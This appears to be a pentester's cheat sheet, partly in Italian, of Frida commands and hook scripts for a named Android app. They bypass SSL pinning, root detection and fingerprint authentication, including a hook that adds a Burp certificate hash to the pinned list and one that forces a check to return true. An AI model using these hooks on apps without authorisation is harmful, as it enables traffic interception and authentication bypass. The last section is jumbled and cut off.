

```

SSL Pinning

> frida -U -no-pause --codeshare akabe1/frida-multiple-unpinning -f com.edenred.mobiletr

> frida -D emulator-5556 --codeshare akabe1/frida-multiple-unpinning -f com.edenred.mobiletr  
  
FingerPrint Bypass  
[https://github.com/WithSecureLabs/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass.js](https://github.com/WithSecureLabs/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass.js)  
2 Method Bypass FingerPrint:  
[https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android)  
  
AntiRoot:  
> frida-U -nopause --codeshare dzonerzy/fridantiroot -f com.edenred.mobiletr.staging  
 

All Frida scripts  
[https://github.com/TheBountyBox/Awesmoe-Frida-Scripts](https://github.com/TheBountyBox/Awesmoe-Frida-Scripts)

> frida -U -f [APP_ID] -l script1.js-l script2.js


Es. Hooking Function:
let getInputCodeWS$INotificationSideChannel$Stub = Java.use("o.getInputCodeWS$INotificationSideChannel$Stub");
getInputCodeWS$INotificationSideChannel$Stub["INotificationSideChannel$_Parcel"].implementation = function (str, strArr) { console.log(`getInputCodeWS$INotificationSideChannel$Stub.INotificationSideChannel$_Parcel is called: str=${str}, strArr=${strArr}`);
	  console.log('adding burp cert hash(sha256/EcB6GkFkxI6FWP9eGOZ+YWL9Hm85Hyb1YM6yP8GVCQs=) to pinned list');
	//let result = this["INotificationSideChannel$_Parcel"](str, strArr);
	  let result = this["INotificationSideChannel$_Parcel"](str,["sha256/EcB6GkFkxI6FWP9eGOZ+YWL9Hm85Hyb1YM6yP8GVCQs="]);
	return result;};

let reportWeirdUCS4 = Java.use("o.reportWeirdUCS4");
	reportWeirdUCS4["equals"].implementation = function (obj) {
	    console.log(`reportWeirdUCS4.equals is called: obj=${obj}`);
	    let result = this["equals"](obj);
	    console.log(`reportWeirdUCS4.equals result=${result}`);
	    //return result;
	    console.log("reportWeirdUCS4.equals returning true");
	    return true;
		};

Hooking function:
Studiare bene https://blog.fadyothman.com/getting-started-with-frida-hooking-main-and-playing-with-its-arguments/
https://www.youtube.com/watch?v=N2JtRXCofUU







###. Bypassing Biometric Authentication
#. Metodo 1 – Bypass senza utilizzo di oggetti crittografici
L'attenzione qui è sul callback onAuthenticationSucceeded , che è cruciale nel processo di autenticazione. I ricercatori di WithSecure hanno sviluppato uno script Frida , consentendo il bypass del NULL CryptoObject in onAuthenticationSucceeded(...) . Lo script impone un bypass automatico dell'autenticazione tramite impronta digitale all'invocazione del metodo. Di seguito è riportato uno snippet semplificato che mostra il bypass in un contesto Android Fingerprint


frida -U -f com.generic.insecurebankingfingerprint --no-pause -l fingerprint-bypass.js



#. Metodo 2 - Approccio alla gestione delle eccezioni:
Un altro script Frida di WithSecure risolve il problema dell'utilizzo non sicuro di oggetti crittografici. Lo script invoca onAuthenticationSucceeded con un CryptoObject che non è stato autorizzato da un'impronta digitale. Se l'applicazione tenta di utilizzare un oggetto di crittografia diverso, attiverà un'eccezione. Lo script si prepara a richiamare onAuthenticationSucceeded e a gestire javax.crypto.IllegalBlockSizeException nella classe Cipher , garantendo che gli oggetti successivi utilizzati dall'applicazione vengano crittografati con la nuova chiave.

frida -U -f com.generic.insecurebankingfingerprint --no-pause -l fingerprint-bypass-via-exception-handling.js


#. Metodo 3 - Strumentazione Strumentazione:
I framework di strumentazione come Xposed o Frida possono essere utilizzati per collegarsi ai metodi dell'applicazione in fase di runtime. Per l'autenticazione delle impronte digitali, questi framework possono:
Simulazione delle richiamate di autenticazione - Bypass SSL Pinning
frida -U -l script-to-bypass-authentication.js --no-pause -f com.generic.in


```